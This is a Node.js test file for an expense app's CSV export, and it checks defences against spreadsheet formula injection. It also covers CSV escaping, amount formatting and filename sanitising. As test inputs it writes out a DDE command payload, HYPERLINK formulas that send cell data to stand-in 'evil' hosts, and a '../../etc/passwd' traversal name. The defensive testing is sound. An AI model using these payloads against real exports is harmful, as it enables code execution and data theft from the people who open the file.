const test = require("node:test");
const assert = require("node:assert/strict");

const csv = require("../src/utils/csv");
const exportService = require("../src/services/exportService");

/**
 * The export file (docs/22-MONETIZATION.md §14 step 3).
 *
 * Two failures matter here and they are not the same kind of thing.
 *
 * **A malformed file** is loud: a stray quote breaks a column and somebody
 * notices immediately.
 *
 * **A formula is silent.** A description reading `=HYPERLINK("https://evil/"&A1)`
 * is a working link the moment the file opens, carrying the row next to it — and
 * the text was typed by *another member*, which in this app means anyone holding
 * an invite link. Nothing about the spreadsheet looks wrong. That is the case most
 * of this file is about.
 */

const cellsOf = (line) => {
  // Deliberately naive: these tests build small, known rows, and a full RFC parser
  // here would be testing the parser rather than the writer.
  const cells = [];
  let current = "";
  let quoted = false;

  for (let i = 0; i < line.length; i += 1) {
    const char = line[i];

    if (quoted) {
      if (char === '"' && line[i + 1] === '"') {
        current += '"';
        i += 1;
      } else if (char === '"') {
        quoted = false;
      } else {
        current += char;
      }
    } else if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      cells.push(current);
      current = "";
    } else {
      current += char;
    }
  }

  cells.push(current);
  return cells;
};

/* ---------------------------- Formula injection --------------------------- */

test("a formula in a description is neutralised", () => {
  /**
   * The attack this file exists for. `'` is what every major spreadsheet reads as
   * "the rest is text" — it is stripped on display and never evaluated.
   */
  for (const payload of [
    "=cmd|'/c calc'!A0",
    "=HYPERLINK(\"https://evil.example.com\",\"Click\")",
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
  ]) {
    const written = csv.cell(payload);
    const value = cellsOf(written)[0];

    assert.ok(
      value.startsWith("'"),
      `"${payload}" was written as ${JSON.stringify(written)} — a spreadsheet will evaluate it`
    );
  }
});

test("quoting alone does not make a formula safe", () => {
  // The mistake worth naming: a quoted field is still evaluated, so escaping for
  // CSV and defanging for a spreadsheet are two separate jobs and both must run.
  const written = csv.cell('=1+1,"x"');

  assert.ok(written.startsWith('"\''), "must be both guarded and quoted");
  assert.equal(cellsOf(written)[0], "'=1+1,\"x\"");
});

test("ordinary text is left alone", () => {
  // The guard must not make every cell ugly — an apostrophe on "Dinner" would show
  // up in Google Sheets as a stray character in thousands of rows.
  for (const value of ["Dinner", "Rent — August", "Riya", "12 eggs", "café", "3 x pizza"]) {
    assert.equal(csv.cell(value), value);
  }
});

/* ------------------------------- CSV rules -------------------------------- */

test("commas, quotes and newlines survive a round trip", () => {
  const cases = [
    "Dinner, drinks and a cab",
    'He said "split it"',
    "Line one\nLine two",
    'Both, "kinds"',
  ];

  for (const value of cases) {
    assert.equal(cellsOf(csv.cell(value))[0], value, `${JSON.stringify(value)} did not survive`);
  }
});

test("an empty or missing value is an empty cell, never the word null", () => {
  for (const value of [null, undefined, ""]) {
    assert.equal(csv.cell(value), "");
  }
});

/* -------------------------------- Numbers --------------------------------- */

test("a negative amount stays negative", () => {
  /**
   * The reason `number` exists at all. Run through `cell`, `-40` would come out as
   * `'-40` — text, in a column somebody is about to sum, and the total would be
   * silently wrong by twice the figure.
   */
  assert.equal(csv.number(-40), "-40.00");
  assert.equal(csv.number(-0.5), "-0.50");
});

test("amounts carry no symbol or separator, so they import as numbers", () => {
  assert.equal(csv.number(1250.5), "1250.50");
  assert.equal(csv.number(1000000), "1000000.00");
  assert.match(csv.number(1250.5), /^\d+\.\d{2}$/);
});

test("a non-number is an empty cell, not NaN", () => {
  // "NaN" imports as text and turns the whole column into text in Excel.
  for (const value of [undefined, null, "", "abc", Infinity, NaN]) {
    assert.equal(csv.number(value), "");
  }
});

/* ------------------------------- Filenames -------------------------------- */

test("a filename cannot contain a path", () => {
  assert.ok(!csv.safeFilename("../../etc/passwd", "csv").includes("/"));
  assert.ok(!csv.safeFilename("..\\..\\windows", "csv").includes("\\"));
  assert.ok(!csv.safeFilename("a/b/c", "csv").includes("/"));
});

test("a filename keeps the group's name readable", () => {
  // The point of the allow-list is that it is not scorched earth: "Flat 302" is a
  // perfectly good filename and should survive as one.
  assert.equal(csv.safeFilename("Flat 302 expenses", "csv"), "Flat 302 expenses.csv");
  assert.equal(csv.safeFilename("Goa Trip 2026", "csv"), "Goa Trip 2026.csv");
});

test("a name with nothing usable in it still produces a file", () => {
  for (const name of ["", "   ", "...", null, undefined, "///"]) {
    const filename = csv.safeFilename(name, "csv");
    assert.match(filename, /^[^.].*\.csv$/, `${JSON.stringify(name)} produced ${filename}`);
  }
});

/* ------------------------------ The rows ---------------------------------- */

const member = (id, name) => ({ _id: id, name });

const expense = (overrides = {}) => ({
  expenseDate: new Date("2026-08-01T00:00:00Z"),
  description: "Groceries",
  category: "FOOD",
  paidBy: "m1",
  amountMinor: 30000,
  splitType: "EQUAL",
  notes: "",
  createdByMemberId: "m1",
  shares: [
    { memberId: "m1", amountMinor: 15000 },
    { memberId: "m2", amountMinor: 15000 },
  ],
  ...overrides,
});

test("every expense row adds up to its own amount", () => {
  /**
   * The property that makes the file worth having: each member's column sums to
   * what they owed, and the row sums to what was spent. A shape that did not hold
   * this would be a worse copy of the screen.
   */
  const members = [member("m1", "Aman"), member("m2", "Riya")];
  const { headers, rows } = exportService.expenseRows([expense()], members, "INR");

  assert.equal(headers[4], "Amount (INR)");
  assert.equal(headers[5], "Aman (INR)");
  assert.equal(headers[6], "Riya (INR)");

  const [row] = rows;
  const amount = Number(row[4]);
  const shares = Number(row[5]) + Number(row[6]);

  assert.equal(shares, amount);
});

test("someone outside a split gets an empty cell, not a zero", () => {
  // "They owed nothing on this line" is a claim; "they were not part of it" is the
  // truth, and only one of them is true here.
  const members = [member("m1", "Aman"), member("m2", "Riya"), member("m3", "Sam")];
  const { rows } = exportService.expenseRows([expense()], members, "INR");

  assert.equal(rows[0][7], "", "Sam was not in this split");
});

test("a member who left still gets a column, so old rows still add up", () => {
  // Their share of March exists whether or not they are in the group in August;
  // dropping the column would silently lose money out of a row.
  const members = [member("m1", "Aman"), member("m2", "Riya")];
  const { rows } = exportService.expenseRows([expense()], members, "INR");

  assert.equal(Number(rows[0][6]), 150);
});

test("a hostile description reaches the file defanged", () => {
  const members = [member("m1", "Aman")];
  const { rows } = exportService.expenseRows(
    [expense({ description: "=HYPERLINK(\"https://evil\",\"x\")", shares: [{ memberId: "m1", amountMinor: 30000 }] })],
    members,
    "INR"
  );

  assert.ok(cellsOf(rows[0].join(","))[1].startsWith("'"));
});

/* -------------------------------- The file -------------------------------- */

test("the file starts with a BOM so Excel reads it as UTF-8", () => {
  // Without it, every ₹ and every accented name arrives as mojibake — and opening
  // it in Excel is the first thing anybody does with an export.
  const buffer = csv.toCsvBuffer(["A"], [["1"]]);

  assert.equal(buffer[0], 0xef);
  assert.equal(buffer[1], 0xbb);
  assert.equal(buffer[2], 0xbf);
});

test("rows are separated by CRLF, and the file ends with one", () => {
  const file = csv.toCsv(["A", "B"], [["1", "2"], ["3", "4"]]);

  assert.equal(file, "A,B\r\n1,2\r\n3,4\r\n");
});

test("a header is escaped like any other cell", () => {
  // A member called "Riya, Jr" is a column name containing a comma.
  const file = csv.toCsv(["Date", "Riya, Jr (INR)"], []);
  assert.equal(cellsOf(file.trim())[1], "Riya, Jr (INR)");
});
